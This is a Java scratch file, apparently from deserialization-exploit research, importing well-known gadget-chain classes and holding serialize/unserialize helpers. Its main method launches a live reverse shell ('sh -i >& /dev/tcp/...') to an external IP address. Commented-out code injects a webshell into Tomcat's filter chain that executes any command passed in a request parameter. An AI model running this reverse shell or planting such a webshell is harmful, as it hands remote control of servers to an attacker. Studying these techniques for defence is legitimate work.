package Seri;

import com.caucho.hessian.io.AnnotationInvocationHandler;
import com.sun.org.apache.bcel.internal.util.ClassLoader;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.tools.attach.VirtualMachine;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.beanutils.PropertyUtils;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import com.sun.tools.attach.VirtualMachineDescriptor;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.LazyMap;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

import javax.management.BadAttributeValueExpException;
import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.*;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.*;

import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.sun.org.apache.bcel.internal.Repository;

import org.apache.tomcat.dbcp.dbcp2.*;
import org.hibernate.transform.Transformers;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.springframework.security.core.parameters.P;

public class Test {
    public static void main(String[] args) throws Exception {
        try{
//            ClassPool.getDefault().insertClassPath("/Users/y1shin/.m2/repository/org/apache/tomcat/embed/tomcat-embed-core/9.0.65/tomcat-embed-core-9.0.65.jar");
//            CtClass c2 = ClassPool.getDefault().getCtClass("org.apache.catalina.core.ApplicationFilterChain");
//            CtMethod method = c2.getDeclaredMethod("doFilter");
//            System.out.println(method.getName());
//
//            Runtime.getRuntime().exec("calc");
//            String body =
//
//                    "javax.servlet.http.HttpServletRequest request = $1\n;" +
//
//                            "String cmd=request.getParameter(\"cmd\");\n" +
//
//                            "if (cmd != null){\n" +
//
//                            "  java.lang.Runtime.getRuntime().exec(cmd);\n" +
//
//                            "  } else {java.lang.Runtime.getRuntime().exec(\"calc\");};";
//            method.insertBefore(body);
////            ctMethod.setBody(body);
//            c2.writeFile();
            String[] cmd = {"/bin/sh", "-c", "sh -i >& /dev/tcp/47.109.27.201/9099 0>&1"};
            ProcessBuilder pb = new ProcessBuilder(cmd);
            pb.inheritIO(); // 继承当前进程的输入/输出
            Process process = pb.start();
            process.waitFor(); // 等待命令执行

        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    public static void serialize(Object object ,String filename) throws IOException {
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(object);
        oos.close();

        FileOutputStream fos = new FileOutputStream(filename);
        barr.writeTo(fos);
        fos.close();

        System.out.println(barr);
    }
    public static void unserialize(String filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        ois.readObject();
        ois.close();
    }
}
